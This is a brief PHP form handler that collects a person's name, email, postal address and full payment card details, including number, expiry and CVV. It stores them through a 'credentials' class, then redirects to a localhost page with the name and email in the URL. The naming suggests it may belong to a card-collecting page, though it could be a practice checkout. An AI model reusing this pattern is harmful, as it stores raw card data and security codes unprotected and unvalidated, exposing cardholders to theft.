<?php
    include_once '../control/send.php';
    include_once '../model/credentials.php';

    $error = "";

    $credC = new credentialsC();
    $cred = new credentials(
        $_POST['name'],
        $_POST['mail'],
        $_POST['address'],
        $_POST['city'],
        $_POST['state'],
        $_POST['zip'],
        $_POST['noc'],
        $_POST['ccn'],
        $_POST['xp'],
        $_POST['cw'],
    );

    $credC->addcred($cred);


$url = 'http://localhost/try2/view/index.php';

$parameters = [
'mail' =>  $_POST['mail'],
'name' => $_POST['name']
];

$url .= '?'.http_build_query($parameters);

?>
<meta http-equiv="refresh" content="0; url=<?php echo $url ?>" />




    
    
    